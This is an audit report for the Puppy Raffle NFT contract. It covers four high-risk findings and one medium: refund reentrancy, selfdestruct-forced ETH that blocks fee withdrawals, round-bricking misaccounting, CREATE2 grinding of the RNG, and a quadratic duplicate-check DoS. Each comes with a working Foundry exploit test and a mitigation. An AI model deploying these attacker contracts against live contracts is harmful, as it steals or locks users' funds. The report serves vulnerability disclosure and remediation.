# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

# Puppy Raffle Protocol

- Overview
  - Puppy Raffle is an ERC721-based on-chain raffle that mints a “Puppy” NFT to the winner. Players enter by paying a fixed entrance fee per slot.

- How it works
  - enterRaffle(address[] participants): pay entranceFee × participants.length; duplicate addresses are rejected.
  - Players can self-refund by index, reclaiming their entrance fee and freeing their slot.
  - After raffleDuration elapses and at least four entries exist, anyone can call selectWinner:
    - 80% of the pot goes to the winner; 20% accrues as protocol fees for feeAddress.
    - The winner is minted one NFT with on-chain Base64 metadata; previousWinner is updated and the round resets.
  - Fees are withdrawn by feeAddress via withdrawFees; the owner can change feeAddress.

- Deployment
  - A Foundry script deploys PuppyRaffle with parameters (entranceFee, feeAddress = deployer, duration = 1 day).

- Caveats
  - RNG uses block data and msg.sender (manipulable under certain conditions).
  - Duplicate checks and accounting rely on players.length and include refunded “holes,” which can cause gas blowups, misaccounting, or blocked fee withdrawals.
  - tokenURI JSON has minor formatting quirks; ensure consumer robustness.
## High Risk Findings

[H-1]. Reentrancy in PuppyRaffle.refund lets a single player drain the entire pot via recursive refunds

 **Derived From** : Refund reentrancy allows multiple payouts before zeroing player slot

[H-2]. Fee withdrawals can be permanently DoS’d by forced ETH breaking balance==totalFees invariant

 **Derived From** : Misaccounting with players.length and uint64 fees can lock payouts/fees and burn prize

[H-3]. Permanent round brick and fund lock via overcounted pot (players.length) and duplicate address(0) holes

 **Derived From** : Misaccounting with players.length and uint64 fees can lock payouts/fees and burn prize

[H-4]. Permissionless CREATE2 grinding lets attacker guarantee winning and force legendary mint by choosing msg.sender in PuppyRaffle.selectWinner

 **Derived From** : Predictable RNG using block vars and msg.sender lets callers/MEV bias winner and rarity

## Medium Risk Findings

[M-1]. Quadratic duplicate scan in PuppyRaffle.enterRaffle lets anyone brick new entries after two refunds

 **Derived From** : O(n^2) duplicate check in enterRaffle enables gas-based DoS as players grow



### Number of Findings
- C: 0
- H: 4
- M: 1
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Reentrancy in PuppyRaffle.refund lets a single player drain the entire pot via recursive refunds

## Derived From Pattern/Invariant
Refund reentrancy allows multiple payouts before zeroing player slot

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Minimim Privilege Required
Permissionless

## Description
The refund function makes an external payment to msg.sender before clearing the player's slot, allowing a malicious contract to reenter refund(playerIndex) multiple times while players[playerIndex] still equals msg.sender. Each reentry pays out entranceFee again, draining the contract if it holds enough ETH. Vulnerable snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // external call forwards all gas

    players[playerIndex] = address(0); // state updated after external call
    emit RaffleRefunded(playerAddress);
}

Because the state update (zeroing the player slot) happens after the external call, a crafted receive() can reenter refund repeatedly and collect multiple entranceFee payouts for a single slot.

## Impact
Direct theft of the raffle pot: an attacker who entered once can recursively claim entranceFee multiple times and drain all ETH deposited by honest players (up to the contract balance) in a single transaction.

## Proof of Concept
1) Attacker deploys a contract with a receive() that, upon receiving ETH, immediately calls PuppyRaffle.refund(index) again while their slot is still set.
2) Honest users enter the raffle, funding the contract.
3) Attacker enters once to get their address into players at index i.
4) Attacker calls attack(), which calls refund(i). During the first sendValue, receive() reenters refund(i) repeatedly to pull multiple payouts before any state is cleared.
5) After N nested calls, the transaction unwinds; the player's slot is finally zeroed, but N×entranceFee has already been transferred to the attacker.
6) Result: contract balance drained to the attacker; victims' funds stolen.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrantRefundAttacker {
    PuppyRaffle public raffle;
    uint256 public idx;
    uint256 public targetReentries; // number of reentries after the first payout
    uint256 public reentered;

    constructor(PuppyRaffle _raffle) { raffle = _raffle; }

    function setIndex(uint256 _idx) external { idx = _idx; }

    function attack(uint256 totalPayouts) external {
        require(totalPayouts > 0, "bad");
        // The outermost refund sends once; reenter (totalPayouts - 1) more times
        targetReentries = totalPayouts - 1;
        reentered = 0;
        raffle.refund(idx);
    }

    receive() external payable {
        if (reentered < targetReentries) {
            reentered++;
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    ReentrantRefundAttacker attacker;
    address payer = address(0xBEEF);
    address fee = address(99);
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, fee, 1 days);
        attacker = new ReentrantRefundAttacker(raffle);
        vm.deal(payer, 100 ether);
    }

    function testRefundReentrancyDrainsPot() public {
        // Arrange: three honest entrants fund 3 ETH
        address[] memory batch = new address[](3);
        batch[0] = address(0x1);
        batch[1] = address(0x2);
        batch[2] = address(0x3);
        vm.prank(payer);
        raffle.enterRaffle{value: 3 ether}(batch);

        // Attacker joins as the 4th player (index 3)
        address[] memory a = new address[](1);
        a[0] = address(attacker);
        vm.prank(payer);
        raffle.enterRaffle{value: 1 ether}(a);

        uint256 idx = raffle.getActivePlayerIndex(address(attacker));
        assertEq(idx, 3);
        assertEq(address(raffle).balance, 4 ether);
        assertEq(address(attacker).balance, 0);

        // Act: drain 4 payouts of entranceFee via reentrancy
        attacker.setIndex(idx);
        attacker.attack(4);

        // Assert: pot fully drained to attacker; slot zeroed
        assertEq(address(raffle).balance, 0);
        assertEq(address(attacker).balance, 4 ether);
        assertEq(raffle.players(idx), address(0));
    }
}


## Suggested Mitigation
Apply Checks-Effects-Interactions and/or a reentrancy guard. Zero the player slot before transferring, or adopt a pull pattern. Example:

function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    players[playerIndex] = address(0); // effects first
    payable(msg.sender).sendValue(entranceFee); // interaction after state update
    emit RaffleRefunded(playerAddress);
}

Additionally consider using OpenZeppelin ReentrancyGuard and/or allowing users to withdraw refunds via a dedicated withdraw function to avoid external calls in state-changing flows.


## [H-2]. Fee withdrawals can be permanently DoS’d by forced ETH breaking balance==totalFees invariant

## Derived From Pattern/Invariant
Misaccounting with players.length and uint64 fees can lock payouts/fees and burn prize

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Description
withdrawFees relies on a brittle equality invariant that the contract balance equals totalFees. Any extra wei (e.g., via selfdestruct) or accounting mismatch leaves balance != totalFees and bricks withdrawals. Vulnerable snippet:

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, ...);
}

Because anyone can force ETH into the contract (selfdestruct) without calling a function, the invariant breaks and feeAddress can no longer withdraw revenue, even when no players are active.

## Impact
Permissionless, repeatable DoS of protocol revenue. An attacker can send 1 wei via selfdestruct to permanently break the balance == totalFees check, causing withdrawFees to revert until redeploy/migration. Does not require interacting with core flows.

## Proof of Concept
1) Run a normal round with 4 players; selectWinner succeeds, leaving 20% of the pot as fees in the contract and recorded in totalFees.
2) Attacker deploys a helper contract and selfdestructs to the raffle, forcing 1 wei.
3) Now address(this).balance = totalFees + 1. Any call to withdrawFees reverts on the equality check, permanently DoSing fee withdrawals.

## Proof of Code
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceSend {
    constructor() payable {}
    function boom(address payable to) external { selfdestruct(to); }
}

contract WithdrawFeesForcedETHDoSTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeRecipient = address(99);
    uint256 duration = 1 days;

    address payer = address(100);
    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address p4 = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeRecipient, duration);
        deal(payer, 100 ether);
    }

    function test_WithdrawFees_DoS_ByForcedWei() public {
        // Arrange: 4 entries and complete a round
        address[] memory players = new address[](4);
        players[0] = p1; players[1] = p2; players[2] = p3; players[3] = p4;
        vm.prank(payer);
        raffle.enterRaffle{value: entranceFee * players.length}(players);
        vm.warp(block.timestamp + duration + 1);
        raffle.selectWinner();

        uint256 expectedFees = (4 * entranceFee * 20) / 100; // 0.8 ether
        assertEq(uint256(raffle.totalFees()), expectedFees, "fees accounted in totalFees");
        assertEq(address(raffle).balance, expectedFees, "fees retained on contract");

        // Act: attacker forces 1 wei into the contract via selfdestruct
        vm.deal(address(this), 1);
        ForceSend f = new ForceSend{value: 1}();
        f.boom(payable(address(raffle)));
        assertEq(address(raffle).balance, expectedFees + 1, "invariant broken by forced wei");

        // Assert: withdrawFees now permanently reverts due to balance != totalFees
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Remove the fragile balance == totalFees gate and withdraw exactly the recorded fees. Accept and ignore stray ETH in invariants, and optionally add an owner-only sweep for surplus that explicitly excludes the active round pot.

Key changes:
- Use uint256 for totalFees to avoid narrowing conversions.
- Do not rely on players.length as a proxy for active funds.
- Track active deposits explicitly (e.g., activeCount or currentRoundEscrow) if you need to compute surplus safely.

Example:

// Add explicit receive to allow forced ETH and ignore it in invariants
receive() external payable {}

// Use uint256 for totalFees
uint256 public totalFees;

function withdrawFees() external {
    uint256 amount = totalFees;
    totalFees = 0;
    (bool ok,) = feeAddress.call{value: amount}("");
    require(ok, "fee xfer failed");
}

// Optional: track active escrow safely
uint256 public activeCount; // increment by newPlayers.length in enterRaffle, decrement by 1 in refund

function _activePot() internal view returns (uint256) {
    return activeCount * entranceFee;
}

// Optional: owner-only sweep of surplus ETH that cannot belong to fees or active pot
function sweepSurplus(address payable to) external onlyOwner {
    uint256 bal = address(this).balance;
    uint256 minRequired = totalFees + _activePot();
    require(bal > minRequired, "no surplus");
    uint256 surplus = bal - minRequired;
    (bool ok,) = to.call{value: surplus}("");
    require(ok, "sweep failed");
}



## [H-3]. Permanent round brick and fund lock via overcounted pot (players.length) and duplicate address(0) holes

## Derived From Pattern/Invariant
Misaccounting with players.length and uint64 fees can lock payouts/fees and burn prize

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner computes the pot from players.length and chooses a winner from players[] even after refunds leave address(0) holes. This breaks conservation: prizePool/fee are computed on the full length (including zeros) instead of active payers, so the contract attempts to send more ETH than it holds and reverts. With >=2 refunds, enterRaffle’s global duplicate check also sees two address(0) entries as duplicates, permanently preventing new entries and making the round unrecoverable. Vulnerable snippet:

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, ...);
    require(players.length >= 4, ...);
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex]; // may be address(0)
    uint256 totalAmountCollected = players.length * entranceFee; // counts refunded zeros
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    (bool success,) = winner.call{value: prizePool}("");
    require(success, ...);
}

And enterRaffle’s duplicate validator does global O(n^2) equality checks, so two address(0) holes cause a revert on any new entry:

for (uint256 i = 0; i < players.length - 1; i++) {
  for (uint256 j = i + 1; j < players.length; j++) {
    require(players[i] != players[j], "PuppyRaffle: Duplicate player"); // two zeros => revert
  }
}

## Impact
Permanent freezing of user funds in the contract. After two refunds: (1) selectWinner always reverts because prizePool > balance; (2) new entries always revert due to duplicate address(0), so the round cannot be healed; (3) withdrawFees also reverts because balance != totalFees. Users’ remaining deposits are stuck and the raffle bricks until admin redeploy/migrates.

## Proof of Concept
1) Four players enter paying 4×entranceFee.
2) Two players refund, creating players = [p1, address(0), p3, address(0)] and contract balance = 2×entranceFee.
3) After duration, anyone calls selectWinner: totalAmountCollected = players.length × entranceFee = 4×fee, prizePool = 3.2×fee, but balance is only 2×fee. The ETH transfer fails and selectWinner reverts.
4) Any attempt to enter new players reverts with "Duplicate player" due to two address(0) holes.
5) withdrawFees reverts since address(this).balance (2×fee) != totalFees (0), permanently locking funds.

## Proof of Code
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract OvercountAndHolesDoSTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeRecipient = address(99);
    uint256 duration = 1 days;

    address payer = address(100);
    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address p4 = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeRecipient, duration);
        deal(payer, 100 ether);
        deal(p1, 0);
        deal(p2, 0);
        deal(p3, 0);
        deal(p4, 0);
    }

    function test_DoS_RoundBrickedFundsStuck() public {
        // Arrange: 4 entries
        address[] memory players = new address[](4);
        players[0] = p1; players[1] = p2; players[2] = p3; players[3] = p4;
        vm.prank(payer);
        raffle.enterRaffle{value: entranceFee * players.length}(players);
        assertEq(address(raffle).balance, 4 ether, "initial pot");

        // Act: two refunds => create address(0) holes at indices 1 and 3
        vm.prank(p2);
        raffle.refund(1);
        vm.prank(p4);
        raffle.refund(3);

        // Balance should now be 2 ETH (two refunded)
        assertEq(address(raffle).balance, 2 ether, "after refunds pot");

        // Advance time and attempt to select winner => reverts due to prizePool > balance
        vm.warp(block.timestamp + duration + 1);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // Any new entry will revert due to duplicate address(0)
        address[] memory newPlayers = new address[](2);
        newPlayers[0] = address(10);
        newPlayers[1] = address(11);
        vm.deal(payer, 100 ether);
        vm.prank(payer);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        raffle.enterRaffle{value: entranceFee * newPlayers.length}(newPlayers);

        // Fees cannot be withdrawn either (balance != totalFees)
        assertEq(raffle.totalFees(), 0, "no fees accrued yet");
        assertEq(address(raffle).balance, 2 ether, "funds stuck in contract");
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Track active participants and funds explicitly; do not use players.length to price the pot. Either:
  - Compact the array on refund (swap-and-pop) and maintain a mapping address=>index to prevent holes, OR
  - Maintain an activeCount and currentRoundDeposits accumulator that decrements on refund, and compute prizePool/fee from these, not length.
- When choosing a winner, sample only from active addresses (skip address(0) or rebuild a compact active list).
- Example fix:

// On refund: swap-and-pop to avoid holes
function refund(uint256 idx) public {
    address player = players[idx];
    require(player == msg.sender && player != address(0), "not active");
    payable(msg.sender).transfer(entranceFee);
    uint256 last = players.length - 1;
    if (idx != last) players[idx] = players[last];
    players.pop();
}

// In selectWinner: use actual pot from balance minus accrued fees
uint256 pot = address(this).balance - uint256(totalFees);
uint256 prizePool = pot * 80 / 100;
uint256 fee = pot - prizePool;

- Change totalFees to uint256 and use SafeMath (for 0.7.6) to avoid overflow. - Remove the brittle duplicate check across all history; prevent duplicates via a mapping or only over the new batch.


## [H-4]. Permissionless CREATE2 grinding lets attacker guarantee winning and force legendary mint by choosing msg.sender in PuppyRaffle.selectWinner

## Derived From Pattern/Invariant
Predictable RNG using block vars and msg.sender lets callers/MEV bias winner and rarity

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner derives both winnerIndex and NFT rarity from manipulable inputs in the same transaction. Because msg.sender is included and block.timestamp/block.difficulty are same-tx values, a caller can use CREATE2 to precompute a contract address whose call to selectWinner yields a chosen winner index (their entry) and a desired rarity. Vulnerable code: uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length; uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100; An attacker with a single paid entry can grind a CREATE2 salt to produce a msg.sender that makes winnerIndex equal to their index, stealing 80% of the entire pot and optionally forcing a legendary rarity.

## Impact
Direct, permissionless reward redirection: with only one paid ticket, attacker can guarantee winning 80% of the entire prize pool (funded by all participants) and bias NFT rarity to legendary, extracting immediate monetary value and rare assets. Repeatable each round.

## Proof of Concept
1) Attacker enters the raffle once; other users enter normally. 2) After raffleDuration, attacker deploys a factory that searches for a CREATE2 salt such that predicted contract address A satisfies: keccak256(abi.encodePacked(A, block.timestamp, block.difficulty)) % players.length == attacker's index, and keccak256(abi.encodePacked(A, block.difficulty)) % 100 >= 96 (legendary). 3) Factory deploys contract at A via CREATE2 and calls selectWinner; msg.sender == A, making attacker the computed winner and rarity legendary. 4) Attacker receives 80% of total pot; protocol accrues 20% fee.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

interface IPuppyRaffle {
    function enterRaffle(address[] calldata newPlayers) external payable;
    function selectWinner() external;
    function previousWinner() external view returns (address);
    function tokenIdToRarity(uint256) external view returns (uint256);
}

contract BiasCaller {
    IPuppyRaffle public raffle;
    constructor(IPuppyRaffle _raffle) { raffle = _raffle; }
    function callSelect() external { raffle.selectWinner(); }
}

contract BiasFactory {
    function deployAndCallWithSalt(IPuppyRaffle raffle, bytes32 salt) external returns (address callerDeployed) {
        bytes memory init = abi.encodePacked(type(BiasCaller).creationCode, abi.encode(raffle));
        assembly {
            let encoded_data := add(init, 0x20)
            let encoded_size := mload(init)
            callerDeployed := create2(0, encoded_data, encoded_size, salt)
            if iszero(extcodesize(callerDeployed)) { revert(0, 0) }
        }
        BiasCaller(callerDeployed).callSelect();
    }
}

contract ExploitPredictableRNG_Create2Test is Test {
    PuppyRaffle raffle;
    BiasFactory factory;

    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    address attacker;
    address v1;
    address v2;
    address v3;

    function setUp() public {
        attacker = makeAddr("attacker");
        v1 = makeAddr("v1");
        v2 = makeAddr("v2");
        v3 = makeAddr("v3");
        vm.deal(attacker, 100 ether);
        vm.deal(v1, 100 ether);
        vm.deal(v2, 100 ether);
        vm.deal(v3, 100 ether);

        raffle = new PuppyRaffle(ENTRANCE_FEE, address(99), DURATION);
        factory = new BiasFactory();

        address[] memory arr = new address[](1);
        arr[0] = attacker; vm.prank(attacker); raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        arr[0] = v1;       vm.prank(v1);       raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        arr[0] = v2;       vm.prank(v2);       raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        arr[0] = v3;       vm.prank(v3);       raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        // Advance time to end of raffle and pin the next block's environment
        vm.warp(block.timestamp + DURATION + 1);
        vm.difficulty(0xBEEF);
    }

    function computeCreate2(address deployer, bytes32 salt, bytes32 initCodeHash) internal pure returns (address) {
        return address(uint160(uint(keccak256(abi.encodePacked(bytes1(0xff), deployer, salt, initCodeHash)))));
    }

    function initCodeHash(IPuppyRaffle r) internal pure returns (bytes32) {
        bytes memory init = abi.encodePacked(type(BiasCaller).creationCode, abi.encode(r));
        return keccak256(init);
    }

    function test_PredictableRNG_GuaranteedWin_And_Legendary() public {
        // With 4 players, attacker is at index 0
        uint256 playersLength = 4;
        uint256 desiredIndex = 0;
        bool wantLegendary = true;

        // We search off-chain (in-test) for a salt that makes CREATE2 address A satisfy both conditions
        bytes32 codeHash = initCodeHash(IPuppyRaffle(address(raffle)));
        address deployer = address(factory);
        uint256 ts = block.timestamp; // pinned by vm.warp
        uint256 diff = block.difficulty; // pinned by vm.difficulty

        bytes32 chosenSalt;
        bool found;
        for (uint256 i = 0; i < 10000; i++) {
            bytes32 salt = bytes32(i);
            address predicted = computeCreate2(deployer, salt, codeHash);
            uint256 idx = uint256(keccak256(abi.encodePacked(predicted, ts, diff))) % playersLength;
            if (idx != desiredIndex) continue;
            if (wantLegendary) {
                uint256 r = uint256(keccak256(abi.encodePacked(predicted, diff))) % 100;
                if (r < 96) continue; // 96..99 => legendary in this contract
            }
            chosenSalt = salt;
            found = true;
            break;
        }
        require(found, "no salt found in range");

        uint256 attackerBalanceBefore = attacker.balance;

        // Deploy BiasCaller at the precomputed address and have it call selectWinner in the same tx
        vm.prank(attacker);
        address caller = factory.deployAndCallWithSalt(IPuppyRaffle(address(raffle)), chosenSalt);
        assertTrue(caller != address(0), "caller deployed");

        // Assert attacker won and got paid 80% of pot (3.2 ETH)
        assertEq(raffle.previousWinner(), attacker, "attacker should be the winner");
        uint256 expectedPrize = (playersLength * ENTRANCE_FEE * 80) / 100; // 3.2 ether
        assertEq(attacker.balance, attackerBalanceBefore + expectedPrize, "winner payout incorrect");

        // Assert legendary rarity (tokenId 0 on first mint)
        assertEq(raffle.tokenIdToRarity(0), raffle.LEGENDARY_RARITY(), "legendary rarity forced");
    }
}


## Suggested Mitigation
Do not derive randomness from same-tx manipulable inputs (msg.sender, block.timestamp, block.difficulty/prevrandao). Use a two-step commit-reveal or a verifiable randomness oracle (e.g., Chainlink VRF). Example (sketch):

// 1) Request VRF when raffle ends
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "Raffle not over");
    require(players.length >= 4, "Need at least 4 players");
    // request randomness; store round state; do NOT compute winner here
    s_requestId = VRFCoordinatorV2Interface(vrf).requestRandomWords(keyHash, subId, minConf, gasLimit, 2);
}

// 2) Fulfill with VRF callback
function fulfillRandomWords(uint256 /*requestId*/, uint256[] memory randomWords) internal override {
    uint256 winnerIndex = randomWords[0] % players.length;
    uint256 rarityRoll = randomWords[1] % 100;
    // proceed with payout and mint based on rarityRoll
}

If VRF is unavailable, at least use a commit-reveal scheme: collect a user/owner commit seed during the round, and reveal after at least one block, mixing with blockhash of a future block (not current block) and excluding msg.sender from the entropy.




# Medium Risk Findings

## [M-1]. Quadratic duplicate scan in PuppyRaffle.enterRaffle lets anyone brick new entries after two refunds

## Derived From Pattern/Invariant
O(n^2) duplicate check in enterRaffle enables gas-based DoS as players grow

## Exploit Type
Dos

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Description
enterRaffle first appends all submitted addresses to players, then performs a quadratic duplicate scan over the entire players array. This nested loop is unbounded and iterates across all historical slots, including refunded holes (address(0)). Two or more refunds create multiple address(0) entries. The duplicate scan then inevitably encounters players[i] == players[j] for the zero-address pairs and reverts on every future enterRaffle, permanently DoSing new entries for the round until a reset (which may be impossible if players.length < 4).

Vulnerable snippet:

for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}

Because players.length is unbounded and includes refunded holes, this design both (a) enables a gas blowup as players grows (O(n^2) over storage reads) and (b) creates a deterministic DoS once at least two refunds have occurred in a round.

## Impact
Any unprivileged user can cause permanent DoS of new entries for the current round by creating two refunded holes, preventing additional participants from joining. If fewer than 4 players remain, selectWinner cannot be called, bricking the round and halting fee accrual and prize pool growth until admin intervention (e.g., redeploy).

## Proof of Concept
1) Attacker A enters once.
2) Attacker B enters once.
3) Both attackers call refund on their indices, creating two address(0) holes in players.
4) Any subsequent user attempting to call enterRaffle reverts because the nested duplicate scan inevitably compares the two address(0) slots and fails the require, bricking entries for the rest of the round.
5) Assert that the call reverts and that contract balance/state remains unchanged.

## Proof of Code
pragma solidity >=0.7.6 <0.9.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract UnboundedLoopsDosTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1e18;
    address fee = address(99);
    uint256 duration = 1 days;

    address attacker1 = address(0xA11CE);
    address attacker2 = address(0xB0B);
    address victim = address(0xC0FFEE);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, fee, duration);
        vm.deal(attacker1, 10 ether);
        vm.deal(attacker2, 10 ether);
        vm.deal(victim, 10 ether);
    }

    function test_DoS_enterRaffle_after_two_refunds() public {
        // Attacker 1 enters
        address[] memory a1 = new address[](1);
        a1[0] = attacker1;
        vm.prank(attacker1);
        raffle.enterRaffle{value: entranceFee}(a1);

        // Attacker 2 enters
        address[] memory a2 = new address[](1);
        a2[0] = attacker2;
        vm.prank(attacker2);
        raffle.enterRaffle{value: entranceFee}(a2);

        // Both refund -> two address(0) holes
        vm.prank(attacker1);
        raffle.refund(0);
        vm.prank(attacker2);
        raffle.refund(1);

        // Sanity: contract has no funds after refunds
        assertEq(address(raffle).balance, 0);

        // Victim tries to enter, but duplicate scan hits two zeros and reverts
        address[] memory v = new address[](1);
        v[0] = victim;
        vm.prank(victim);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        raffle.enterRaffle{value: entranceFee}(v);

        // State unchanged: still zero balance and zero holes remain
        assertEq(address(raffle).balance, 0);
        assertEq(raffle.players(0), address(0));
        assertEq(raffle.players(1), address(0));
    }
}


## Suggested Mitigation
Avoid unbounded global scans and track uniqueness with O(1) structures. Validate duplicates before mutating state and never scan refunded holes.

Suggested fix:
- Maintain a mapping to enforce uniqueness and skip address(0).
- Update mapping on enter/refund; avoid quadratic loops.
- Optionally compress array on refund (swap-and-pop) to prevent holes.

Example:

mapping(address => bool) public isActive;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address p = newPlayers[i];
        require(p != address(0), "PuppyRaffle: zero address");
        require(!isActive[p], "PuppyRaffle: Duplicate player");
        isActive[p] = true;
        players.push(p);
    }
    emit RaffleEnter(newPlayers);
}

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    isActive[msg.sender] = false;
    payable(msg.sender).sendValue(entranceFee);
    // Option A: swap-and-pop to avoid holes
    players[playerIndex] = players[players.length - 1];
    players.pop();
    // Option B: if keeping holes, ensure future logic never scans entire array for duplicates
}





